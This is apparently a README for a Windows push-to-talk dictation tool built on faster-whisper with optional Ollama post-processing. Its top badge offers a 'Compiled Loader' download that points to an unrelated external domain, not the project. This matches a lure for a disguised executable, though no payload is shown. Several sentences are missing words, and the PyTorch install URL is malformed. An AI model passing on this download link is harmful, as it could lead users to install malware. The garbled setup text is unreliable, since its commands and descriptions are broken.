# Wispr PTT

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A Windows background daemon for frictionless voice-to-text. Hold a hotkey → speak →  → your words are transcribed and injected at the cursor. No cloud. No UI clutter. Just fast, local dictation.

Built on [faster-whisper](https://github.com/SYSTRAN/faster-whisper) (GPU-accelerated Whisper via CTranslate2) with an optional local LLM pass (Ollama) to clean up structure and match your writing style.

---

## How it works

```
Hold hotkey → mic opens
 hotkey → Whisper transcribes (GPU: ~400ms, CPU: ~3s)
Text injected at cursor via clipboard swap
```

The tray icon shows current state: gray (idle) · red (recording) · yellow (processing).  
A floating red circle appears on screen while the mic is open.

---

## Requirements

- Windows 10/11
- Python 3.10+
- NVIDIA GPU recommended (CUDA 12.4). Falls back to CPU automatically.
- [Ollama](https://ollama.com) (optional, for agent mode)

---

## Installation

**1. Clone and create a virtual environment**
```bash
git clone https://github.com/yourusername/wispr-ptt.git
cd wispr-ptt
python -m venv .venv
.venv\Scripts\activate
```

**2. Install PyTorch with CUDA support**
```bash
pip install torch==2.6.0 --index-url https://.pytorch.org/whl/cu124
```

**3. Install remaining dependencies**
```bash
pip install -r whisper_ptt/requirements.txt
```

**4. Configure**

Edit `whisper_ptt/config.yaml` to set your hotkey and model preferences. See [Configuration](#configuration) below.

**5. Run**
```bash
python whisper_ptt/main.py
```

On first run, the Whisper model (~500MB for `small`)  automatically.

---

## Configuration

All settings live in `whisper_ptt/config.yaml`. No code changes needed.

```yaml
hotkey: "alt+w"           # Hold to record,  to transcribe

model:
  size: "small"           # tiny / base / small / medium / large-v3
  device: "cuda"          # cuda or cpu
  compute_type: "float16" # float16 (GPU) or int8 (CPU)
  language: "en"

audio:
  samplerate: 16000
  channels: 1
  max_duration_seconds: 60

injection:
  method: "clipboard"     # clipboard (default) or keyboard_write
  clipboard_restore_delay_ms: 50

startup:
  add_to_windows_startup: false   # Register with Task Scheduler on startup

agent:
  enabled: true
  ollama_url: "http://localhost:11434"
  model: "qwen3:8b"
  agent_hotkey: "ctrl+alt+e"      # Use this hotkey to run LLM post-processing
  knowledge_base_dir: "knowledge_base"
  ollama_timeout_seconds: 15

log_level: "INFO"
```

### Hotkeys

| Hotkey | Action |
|--------|--------|
| `alt+w` (default) | Hold to record,  to transcribe and inject |
| `ctrl+alt+e` (default) | Same, but also runs the Ollama agent to clean up formatting |

---

## Agent mode (optional)

Agent mode sends your transcription to a locally running Ollama LLM that reformats it to match your writing style before injecting.

**Setup:**
1. [Install Ollama](https://ollama.com/)
2. Pull a model: `ollama pull qwen3:8b`
3. Add writing style examples to `whisper_ptt/knowledge_base/` as `.txt` files
4. Use `ctrl+alt+e` instead of `alt+w` to invoke the agent

If Ollama is unavailable, the raw transcription is injected as a fallback — the app never blocks.

---

## Running tests

```bash
pip install pytest
pytest tests/ -v
```

---

## Architecture

```
main.py          — thread orchestration, hotkey wiring, startup
config.py        — YAML loading + dataclass config with validation
audio.py         — sounddevice capture, thread-safe ring buffer
transcribe.py    — faster-whisper model wrapper
inject.py        — clipboard-swap + keyboard.write injection
agent.py         — Ollama HTTP client for optional LLM post-processing
overlay.py       — tkinter floating recording indicator
tray.py          — pystray system tray icon + state display
```

**Threading model:**

| Thread | Role |
|--------|------|
| Main | tkinter overlay (event loop) |
| Worker | dequeue → transcribe → inject |
| Tray | pystray daemon |
| Audio | sounddevice callback (internal) |

Audio is never written to disk — it lives in a memory buffer and is cleared immediately after injection.

---

## Limitations

- Windows only (hotkey listener uses the `keyboard` library)
- Requires a non-elevated process (do not run as Administrator)
- First run  the Whisper model (~500MB for `small`)
- CPU inference is ~3–5s per 6-second utterance; GPU is ~400ms
